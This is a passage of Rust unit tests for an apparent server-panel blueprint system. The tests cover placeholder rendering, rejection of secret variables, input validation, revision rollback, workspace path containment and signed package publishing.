                 VALUES('b','srv-blueprint','d','a','generic','native','echo ${input.MC_VERSION}',?1,?2,?3,'stop','now','now')",
                rusqlite::params![
                    r#"{"version":"${input.MC_VERSION}","name":"${workspace.name}"}"#,
                    "echo installing ${input.MC_VERSION} into ${workspace.name}",
                    r#"[{"name":"Version","description":"","env_var":"MC_VERSION","default_value":"1.20.1","user_viewable":true,"user_editable":true,"required":false,"kind":{"type":"text"}}]"#
                ],
            )
            .unwrap();
            let bid = conn.last_insert_rowid();
            conn.execute(
                "INSERT INTO servers(uuid,name,user_id,blueprint_id,startup,memory_mb,disk_mb,cpu_percent,created_at,updated_at)
                 VALUES('s','srv',?1,?2,'echo hi',1024,8192,100,'now','now')",
                rusqlite::params![uid, bid],
            )
            .unwrap();
            let sid = conn.last_insert_rowid();
            drop(conn);
            TestDb { db, path, sid }
        }

        fn server(&self) -> Server {
            models::get_server(&self.db, self.sid).unwrap()
        }

        fn set_default_config(&self, cfg: Option<&str>) {
            let conn = self.db.get().unwrap();
            conn.execute(
                "UPDATE blueprints SET default_config=?1 WHERE id=(SELECT blueprint_id FROM servers WHERE id=?2)",
                rusqlite::params![cfg, self.sid],
            )
            .unwrap();
        }
    }

    /// Console hub for install tests: a unique logs dir keeps concurrent tests
    /// from clobbering each other's log files.
    fn test_hub() -> crate::services::console::ConsoleHub {
        let mut cfg = crate::config::Config::default();
        cfg.paths.logs_dir = std::env::temp_dir().join(format!(
            "voltpanel-blueprint-logs-{}-{}",
            std::process::id(),
            DB_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        crate::services::console::ConsoleHub::new(cfg)
    }

    impl Drop for TestDb {
        fn drop(&mut self) {
            // `db` drops first (declaration order), closing the connection
            // before the files are unlinked.
            let wal = self.path.with_extension("db-wal");
            let shm = self.path.with_extension("db-shm");
            let _ = std::fs::remove_file(&self.path);
            let _ = std::fs::remove_file(wal);
            let _ = std::fs::remove_file(shm);
        }
    }

    #[test]
    fn install_script_placeholders_resolve_like_startup() {
        let t = TestDb::new();
        let server = t.server();
        let blueprint = models::get_blueprint(&t.db, server.blueprint_id).unwrap();
        // The same render pipeline run_install now uses for the script.
        let script = render(
            blueprint.install_script.as_deref().unwrap(),
            &template_context(&t.db, &server).unwrap(),
        )
        .unwrap();
        assert_eq!(script, "echo installing 1.20.1 into srv");
    }

    #[test]
    fn install_script_unknown_placeholder_is_an_error() {
        let t = TestDb::new();
        let server = t.server();
        let ctx = template_context(&t.db, &server).unwrap();
        let err = render("echo ${input.NOPE}", &ctx).unwrap_err();
        assert!(err.to_string().contains("input.NOPE"), "got: {err}");
    }

    #[test]
    fn default_config_resolves_placeholders() {
        let t = TestDb::new();
        let server = t.server();
        let cfg = build_default_config(&t.db, &server).unwrap().unwrap();
        assert_eq!(cfg["version"], "1.20.1");
        assert_eq!(cfg["name"], "srv");
    }

    #[test]
    fn non_viewable_vars_never_render_into_startup_or_config() {
        let t = TestDb::new();
        let conn = t.db.get().unwrap();
        conn.execute(
            "UPDATE blueprints SET variables=?1 WHERE id=(SELECT blueprint_id FROM servers WHERE id=?2)",
            rusqlite::params![
                r#"[{"name":"Version","description":"","env_var":"MC_VERSION","default_value":"1.20.1","user_viewable":true,"user_editable":true,"required":false,"kind":{"type":"text"}},{"name":"Token","description":"","env_var":"SECRET_TOKEN","default_value":"hunter2","user_viewable":false,"user_editable":false,"required":false,"kind":{"type":"text"}}]"#,
                t.sid
            ],
        )
        .unwrap();
        conn.execute(
            "UPDATE servers SET startup=?1 WHERE id=?2",
            rusqlite::params!["echo ${input.MC_VERSION} ${input.SECRET_TOKEN}", t.sid],
        )
        .unwrap();
        drop(conn);
        let server = t.server();

        // Startup rendering must reject the non-viewable placeholder: the
        // secret never lands in the launch command the console shows.
        let err = resolve_startup(&t.db, &server).unwrap_err();
        assert!(
            err.to_string().contains("input.SECRET_TOKEN"),
            "startup leaked secret, got: {err}"
        );

        // Same for default_config JSON.
        t.set_default_config(Some(r#"{"version":"${input.MC_VERSION}","token":"${input.SECRET_TOKEN}"}"#));
        let err = build_default_config(&t.db, &server).unwrap_err();
        assert!(
            err.to_string().contains("input.SECRET_TOKEN"),
            "config leaked secret, got: {err}"
        );

        // The secret-delivery channel is the process env: the value must still
        // reach the workload there.
        let env = env_for_server(&t.db, &server);
        assert!(
            env.iter().any(|(k, v)| k == "SECRET_TOKEN" && v == "hunter2"),
            "secret missing from process env"
        );
    }

    #[test]
    fn default_config_absent_is_none() {
        let t = TestDb::new();
        t.set_default_config(None);
        let server = t.server();
        assert!(build_default_config(&t.db, &server).unwrap().is_none());
    }

    #[test]
    fn default_config_malformed_json_is_an_error() {
        let t = TestDb::new();
        t.set_default_config(Some("{oops"));
        let server = t.server();
        let err = build_default_config(&t.db, &server).unwrap_err();
        assert!(
            err.to_string().contains("invalid default_config json"),
            "got: {err}"
        );
    }

    #[test]
    fn install_script_rejects_invalid_resolved_input() {
        let t = TestDb::new();
        let conn = t.db.get().unwrap();
        conn.execute(
            "UPDATE blueprints SET variables=?1 WHERE id=(SELECT blueprint_id FROM servers WHERE id=?2)",
            rusqlite::params![
                r#"[{"name":"Threads","description":"","env_var":"THREADS","default_value":"lots","user_viewable":true,"user_editable":true,"required":false,"kind":{"type":"number","min":1,"max":64}}]"#,
                t.sid
            ],
        )
        .unwrap();
        drop(conn);
        let server = t.server();
        let blueprint = models::get_blueprint(&t.db, server.blueprint_id).unwrap();
        let err = run_install(
            &t.db,
            &server,
            &blueprint,
            &crate::services::proc::Notifier::default(),
            &test_hub(),
        )
        .unwrap_err();
        assert!(err.to_string().contains("THREADS"), "got: {err}");
    }

    #[test]
    fn install_script_rejects_missing_required_input() {
        let t = TestDb::new();
        let conn = t.db.get().unwrap();
        conn.execute(
            "UPDATE blueprints SET variables=?1 WHERE id=(SELECT blueprint_id FROM servers WHERE id=?2)",
            rusqlite::params![
                r#"[{"name":"Token","description":"","env_var":"TOKEN","default_value":"","user_viewable":true,"user_editable":true,"required":true,"kind":{"type":"text"}}]"#,
                t.sid
            ],
        )
        .unwrap();
        drop(conn);
        let server = t.server();
        let blueprint = models::get_blueprint(&t.db, server.blueprint_id).unwrap();
        let err = run_install(
            &t.db,
            &server,
            &blueprint,
            &crate::services::proc::Notifier::default(),
            &test_hub(),
        )
        .unwrap_err();
        assert!(err.to_string().contains("TOKEN"), "got: {err}");
    }

    #[test]
    fn resolve_startup_rejects_invalid_number_input() {
        let t = TestDb::new();
        let conn = t.db.get().unwrap();
        conn.execute(
            "UPDATE blueprints SET variables=?1 WHERE id=(SELECT blueprint_id FROM servers WHERE id=?2)",
            rusqlite::params![
                r#"[{"name":"Threads","description":"","env_var":"THREADS","default_value":"lots","user_viewable":true,"user_editable":true,"required":false,"kind":{"type":"number","min":1,"max":64}}]"#,
                t.sid
            ],
        )
        .unwrap();
        drop(conn);
        let server = t.server();
        let err = resolve_startup(&t.db, &server).unwrap_err();
        assert!(err.to_string().contains("THREADS"), "got: {err}");
    }

    #[test]
    fn build_default_config_rejects_invalid_number_input() {
        let t = TestDb::new();
        let conn = t.db.get().unwrap();
        conn.execute(
            "UPDATE blueprints SET variables=?1 WHERE id=(SELECT blueprint_id FROM servers WHERE id=?2)",
            rusqlite::params![
                r#"[{"name":"Threads","description":"","env_var":"THREADS","default_value":"lots","user_viewable":true,"user_editable":true,"required":false,"kind":{"type":"number","min":1,"max":64}}]"#,
                t.sid
            ],
        )
        .unwrap();
        drop(conn);
        let server = t.server();
        let err = build_default_config(&t.db, &server).unwrap_err();
        assert!(err.to_string().contains("THREADS"), "got: {err}");
    }

    #[test]
    fn snapshot_and_update_records_coherent_revision() {
        let t = TestDb::new();
        let server = t.server();
        let before = models::get_blueprint(&t.db, server.blueprint_id).unwrap();
        let mut updated = before.clone();
        updated.name = "renamed-blueprint".into();
        updated.install_script = Some("echo v2".into());
        let version = snapshot_and_update(&t.db, before.id, &updated, "alice", "rename").unwrap();
        assert_eq!(version, 2);
        // The revision records the exact pre-update content, keyed by digest.
        let snap = revision_snapshot(&t.db, before.id, 2).unwrap();
        assert_eq!(snap, content_doc(&before));
        let metas = list_revisions(&t.db, before.id).unwrap();
        assert_eq!(metas.len(), 1);
        assert_eq!(metas[0].version, 2);
        assert_eq!(metas[0].digest, digest_of(&before));
        assert_eq!(metas[0].author, "alice");
        // The live row carries the update with the bumped version in lockstep.
        let after = models::get_blueprint(&t.db, before.id).unwrap();
        assert!(content_equals(&updated, &after));
        assert_eq!(after.name, "renamed-blueprint");
        let version_col: i64 =
            t.db.get().unwrap()
                .query_row(
                    "SELECT version FROM blueprints WHERE id=?1",
                    [before.id],
                    |r| r.get(0),
                )
                .unwrap();
        assert_eq!(version_col, 2);
    }

    #[test]
    fn snapshot_bumps_version_in_lockstep() {
        let t = TestDb::new();
        let server = t.server();
        let before = models::get_blueprint(&t.db, server.blueprint_id).unwrap();
        assert_eq!(snapshot(&t.db, before.id, "alice", "baseline").unwrap(), 2);
        assert_eq!(snapshot(&t.db, before.id, "alice", "again").unwrap(), 3);
        let metas = list_revisions(&t.db, before.id).unwrap();
        assert_eq!(metas.len(), 2);
        assert_eq!(metas[0].version, 3);
        assert_eq!(metas[1].version, 2);
        for m in &metas {
            assert_eq!(m.digest, digest_of(&before));
        }
    }

    #[test]
    fn rollback_restores_snapshot_and_is_undoable() {
        let t = TestDb::new();
        let server = t.server();
        let before = models::get_blueprint(&t.db, server.blueprint_id).unwrap();
        let mut updated = before.clone();
        updated.name = "renamed".into();
        assert_eq!(
            snapshot_and_update(&t.db, before.id, &updated, "alice", "rename").unwrap(),
            2
        );
        assert_eq!(rollback(&t.db, before.id, 2, "alice").unwrap(), 3);
        let after = models::get_blueprint(&t.db, before.id).unwrap();
        assert!(content_equals(&before, &after));
        // The undo snapshot (v3) records the pre-rollback state.
        let undo = revision_snapshot(&t.db, before.id, 3).unwrap();
        assert_eq!(undo, content_doc(&updated));
    }

    #[test]
    fn rollback_rejects_corrupt_snapshot() {
        let t = TestDb::new();
        let server = t.server();
        let before = models::get_blueprint(&t.db, server.blueprint_id).unwrap();
        let v = snapshot(&t.db, before.id, "alice", "baseline").unwrap();
        let conn = t.db.get().unwrap();
        let snap: String = conn
            .query_row(
                "SELECT snapshot FROM blueprint_revisions WHERE blueprint_id=?1 AND version=?2",
                rusqlite::params![before.id, v],
                |r| r.get(0),
            )
            .unwrap();
        let mut doc: serde_json::Value = serde_json::from_str(&snap).unwrap();
        doc["variables"] = serde_json::json!("not-an-array");
        conn.execute(
            "UPDATE blueprint_revisions SET snapshot=?1 WHERE blueprint_id=?2 AND version=?3",
            rusqlite::params![doc.to_string(), before.id, v],
        )
        .unwrap();
        drop(conn);
        let err = rollback(&t.db, before.id, v, "alice").unwrap_err();
        assert!(err.to_string().contains("variables"), "got: {err}");
    }
    // ---------------- Import & save-time validation ----------------

    fn import_doc(variables: serde_json::Value) -> String {
        serde_json::json!({
            "name": "imp",
            "description": "",
            "author": "",
            "category": "generic",
            "runtime_hint": "native",
            "startup": "echo hi",
            "variables": variables,
            "stop": "stop",
        })
        .to_string()
    }

    #[test]
    fn validate_inputs_rejects_duplicate_env_var() {
        let mut a = bp().variables[0].clone();
        a.env_var = "DUP".into();
        let mut b = a.clone();
        b.name = "second".into();
        let err = validate_inputs(&[a, b]).unwrap_err();
        assert!(err.to_string().contains("DUP"), "got: {err}");
    }

    #[test]
    fn validate_inputs_rejects_empty_env_var() {
        let mut var = bp().variables[0].clone();
        var.env_var = "  ".into();
        let err = validate_inputs(&[var]).unwrap_err();
        assert!(err.to_string().contains("env_var"), "got: {err}");
    }

    #[test]
    fn validate_inputs_rejects_invalid_default_for_kind() {
        let mut var = bp().variables[0].clone();
        var.kind = InputKind::Number {
            min: Some(1.0),
            max: Some(64.0),
        };
        var.default_value = "lots".into();
        let err = validate_inputs(&[var]).unwrap_err();
        assert!(err.to_string().contains("default_value"), "got: {err}");
    }

    #[test]
    fn validate_inputs_rejects_choice_without_options() {
        let mut var = bp().variables[0].clone();
        var.kind = InputKind::Choice { options: vec![] };
        let err = validate_inputs(&[var]).unwrap_err();
        assert!(err.to_string().contains("option"), "got: {err}");
    }

    #[test]
    fn validate_inputs_rejects_invalid_pattern() {
        let mut var = bp().variables[0].clone();
        var.kind = InputKind::Text {
            max_len: None,
            pattern: Some("([unclosed".into()),
        };
        let err = validate_inputs(&[var]).unwrap_err();
        assert!(err.to_string().contains("pattern"), "got: {err}");
    }

    #[test]
    fn validate_inputs_accepts_valid_declaration() {
        let mut var = bp().variables[0].clone();
        var.kind = InputKind::Choice {
            options: vec!["a".into(), "b".into()],
        };
        var.default_value = "a".into();
        assert!(validate_inputs(&[var]).is_ok());
    }

    #[test]
    fn parse_blueprint_json_rejects_empty_startup() {
        let doc = serde_json::json!({
            "name": "imp",
            "description": "",
            "author": "",
            "category": "generic",
            "runtime_hint": "native",
            "startup": "",
            "variables": [],
            "stop": "stop",
        })
        .to_string();
        let err = parse_blueprint_json(&doc).unwrap_err();
        assert!(err.to_string().contains("startup"), "got: {err}");
    }

    #[test]
    fn parse_blueprint_json_rejects_oversize_payload() {
        let doc = format!(
            r#"{{"name":"x","description":"{}","startup":"echo hi"}}"#,
            "a".repeat(MAX_BLUEPRINT_IMPORT_BYTES + 1)
        );
        let err = parse_blueprint_json(&doc).unwrap_err();
        assert!(err.to_string().contains("limit"), "got: {err}");
    }

    #[test]
    fn parse_blueprint_json_validates_declared_inputs() {
        let bad = import_doc(serde_json::json!([
            {"name": "A", "description": "", "env_var": "A", "default_value": "x", "user_viewable": true, "user_editable": true, "required": false, "kind": {"type": "number", "min": 1, "max": 2}}
        ]));
        let err = parse_blueprint_json(&bad).unwrap_err();
        assert!(err.to_string().contains("default_value"), "got: {err}");
        let dup = import_doc(serde_json::json!([
            {"name": "A", "description": "", "env_var": "X", "default_value": "", "user_viewable": true, "user_editable": true, "required": false, "kind": {"type": "text"}},
            {"name": "B", "description": "", "env_var": "X", "default_value": "", "user_viewable": true, "user_editable": true, "required": false, "kind": {"type": "text"}}
        ]));
        assert!(parse_blueprint_json(&dup).is_err());
    }

    #[test]
    fn parse_blueprint_json_accepts_valid_document() {
        let doc = import_doc(serde_json::json!([
            {"name": "A", "description": "", "env_var": "X", "default_value": "1", "user_viewable": true, "user_editable": true, "required": false, "kind": {"type": "text"}}
        ]));
        let parsed = parse_blueprint_json(&doc).unwrap();
        assert_eq!(parsed.startup, "echo hi");
        assert_eq!(parsed.variables.len(), 1);
    }

    // ---------------- Workspace path containment ----------------

    #[test]
    fn enforce_workspace_path_accepts_relative_paths() {
        let temp = tempfile::tempdir().unwrap();
        let dir = temp.path().join("ws");
        std::fs::create_dir_all(dir.join("data")).unwrap();
        assert!(enforce_workspace_path("P", &dir, "data/db.sqlite").is_ok());
        assert!(enforce_workspace_path("P", &dir, "new.txt").is_ok());
        assert!(enforce_workspace_path("P", &dir, "").is_ok());
    }

    #[test]
    fn enforce_workspace_path_rejects_symlink_escape() {
        use std::os::unix::fs::symlink;
        let temp = tempfile::tempdir().unwrap();
        let dir = temp.path().join("ws");
        let outside = temp.path().join("outside");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(&outside, b"secret").unwrap();
        symlink(&outside, dir.join("escape")).unwrap();
        let err = enforce_workspace_path("P", &dir, "escape").unwrap_err();
        assert!(err.to_string().contains("workspace"), "got: {err}");
        // A not-yet-created file under a symlinked directory is caught too.
        let err = enforce_workspace_path("P", &dir, "escape/new.txt").unwrap_err();
        assert!(err.to_string().contains("workspace"), "got: {err}");
    }

    #[test]
    fn enforce_workspace_path_skips_missing_workspace() {
        let temp = tempfile::tempdir().unwrap();
        let dir = temp.path().join("not-created-yet");
        assert!(enforce_workspace_path("P", &dir, "x").is_ok());
    }

    // ---------------- VoltSpec Registry ----------------

    fn reg_bp() -> Blueprint {
        Blueprint {
            id: 7,
            uuid: "01234567-89ab-cdef-0123-456789abcdef".into(),
            name: "Velocity Proxy v2".into(),
            description: "edge proxy".into(),
            author: "alice".into(),
            category: "web".into(),
            runtime_hint: "native".into(),
            startup: "java -jar app.jar".into(),
            default_config: Some(r#"{"server.properties": {"port": 25565}}"#.into()),
            install_script: Some("apt-get install -y openjdk".into()),
            variables: vec![],
            stop_command: "stop".into(),
            created_at: "t".into(),
            updated_at: "t".into(),
        }
    }

    #[test]
    fn canonical_json_sorts_keys_and_is_deterministic() {
        let a = serde_json::json!({ "z": 1, "a": { "y": 2, "b": [3, { "q": 4 }] } });
        let b = serde_json::json!({ "a": { "b": [3, { "q": 4 }], "y": 2 }, "z": 1 });
        assert_eq!(canonical_json(&a), canonical_json(&b));
        assert!(canonical_json(&a).contains("\"a\":"));
        let s = canonical_json(&a);
        assert!(s.find("\"a\"").unwrap() < s.find("\"z\"").unwrap(), "keys sort: {s}");
    }

    #[test]
    fn package_id_from_name_slugs_and_sanitizes() {
        assert_eq!(package_id_from_name("Velocity Proxy v2"), "velocity-proxy-v2");
        assert_eq!(package_id_from_name("A  B__C!!!"), "a-b-c");
        assert_eq!(package_id_from_name("!!!"), "package");
        assert_eq!(package_id_from_name(".."), "package");
    }

    #[test]
    fn signature_round_trips_and_tamper_is_rejected() {
        let mut csprng = rand::rngs::OsRng;
        let key = ed25519_dalek::SigningKey::generate(&mut csprng);
        let seed = hex::encode(key.to_bytes());
        let mut doc = build_package_doc(&reg_bp(), 3, "alice");
        assert!(!package_is_signed(&doc));
        publish_package(std::path::Path::new("."), &mut doc, Some(&seed)).unwrap();
        assert!(package_is_signed(&doc));
        assert!(verify_package_signature(&doc).unwrap());
        // Signing again must not accumulate fields: one signature, still valid.
        let mut again = doc.clone();
        publish_package(std::path::Path::new("."), &mut again, Some(&seed)).unwrap();
        assert!(package_is_signed(&again));
        assert!(verify_package_signature(&again).unwrap());
        // Tampering with signed content must fail verification.
        let mut tampered = doc.clone();
        tampered["version"] = serde_json::json!(99);
        assert!(verify_package_signature(&tampered).is_err());
        // Swapping in a different public key must fail too.
        let mut swapped = doc.clone();
        swapped["public_key"] = serde_json::json!(hex::encode(
            ed25519_dalek::VerifyingKey::from(
                &ed25519_dalek::SigningKey::generate(&mut csprng)
            )
            .to_bytes()
        ));
        assert!(verify_package_signature(&swapped).is_err());
        // Unsigned documents verify as "not signed", not as an error.
        let unsigned = build_package_doc(&reg_bp(), 1, "alice");
        assert!(!verify_package_signature(&unsigned).unwrap());
    }

    #[test]
    fn signing_key_from_hex_validates_input() {
        let mut csprng = rand::rngs::OsRng;
        let key = ed25519_dalek::SigningKey::generate(&mut csprng);
        let seed = hex::encode(key.to_bytes());
        assert!(signing_key_from_hex(&seed).is_ok());
        assert!(signing_key_from_hex("zz").is_err());
        assert!(signing_key_from_hex(&hex::encode([0u8; 16])).is_err()); // wrong length
    }

    #[test]
    fn publish_list_load_round_trip_with_provenance() {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path();
        let seed = hex::encode([7u8; 32]);
        let mut doc = build_package_doc(&reg_bp(), 2, "alice");
        publish_package(root, &mut doc, Some(&seed)).unwrap();

        let listed = list_registry_packages(root).unwrap();
        assert_eq!(listed.len(), 1);
        assert_eq!(listed[0].id, "velocity-proxy-v2");
        assert_eq!(listed[0].version, 2);
        assert_eq!(listed[0].source_uuid, reg_bp().uuid);
        assert!(listed[0].signed);
        assert!(listed[0].signature_valid);

        let loaded = load_registry_package(root, "velocity-proxy-v2", 2).unwrap();
        assert_eq!(loaded["blueprint"]["startup"], "java -jar app.jar");
        assert_eq!(loaded["blueprint"]["config"]["server.properties"]["port"], 25565);
        // Loading a missing version is an error, not a panic.
        assert!(load_registry_package(root, "velocity-proxy-v2", 9).is_err());
        assert!(load_registry_package(root, "nope", 1).is_err());

        let prov = PackageProvenance {
            package_id: "velocity-proxy-v2".into(),
            version: 2,
            source_url: Some("https://registry.example/v2.json".into()),
            public_key: Some(public_key_hex(&signing_key_from_hex(&seed).unwrap())),
            signature: doc["signature"].as_str().map(str::to_string),
            verified: true,
            installed_at: Utc::now().to_rfc3339(),
        };
        record_import_provenance(root, &reg_bp().uuid, &prov).unwrap();
        let back = read_import_provenance(root, &reg_bp().uuid).unwrap().unwrap();
        assert_eq!(back.package_id, "velocity-proxy-v2");
        assert_eq!(back.version, 2);
        assert!(back.verified);
        assert!(read_import_provenance(root, "missing-uuid").unwrap().is_none());
        let installs = local_registry_installs(root).unwrap();
        assert_eq!(installs.get(reg_bp().uuid.as_str()), Some(&("velocity-proxy-v2".into(), 2)));
    }

    #[test]
    fn unsigned_package_publishes_and_lists_cleanly() {
        let temp = tempfile::tempdir().unwrap();
        let mut doc = build_package_doc(&reg_bp(), 1, "bob");
        publish_package(temp.path(), &mut doc, None).unwrap();
        let listed = list_registry_packages(temp.path()).unwrap();
        assert_eq!(listed.len(), 1);
        assert!(!listed[0].signed);
        assert!(!listed[0].signature_valid);
        let loaded = load_registry_package(temp.path(), "velocity-proxy-v2", 1).unwrap();
        assert!(!package_is_signed(&loaded));
    }

    #[test]
    fn republish_same_version_overwrites_atomically() {
        let temp = tempfile::tempdir().unwrap();
        let mut doc = build_package_doc(&reg_bp(), 1, "alice");
        publish_package(temp.path(), &mut doc, None).unwrap();
        let mut doc2 = build_package_doc(&reg_bp(), 1, "alice");
        doc2["description"] = serde_json::json!("updated");
        publish_package(temp.path(), &mut doc2, None).unwrap();
        let listed = list_registry_packages(temp.path()).unwrap();
        assert_eq!(listed.len(), 1, "republish must replace, not duplicate");
        assert_eq!(listed[0].description, "updated");
    }
}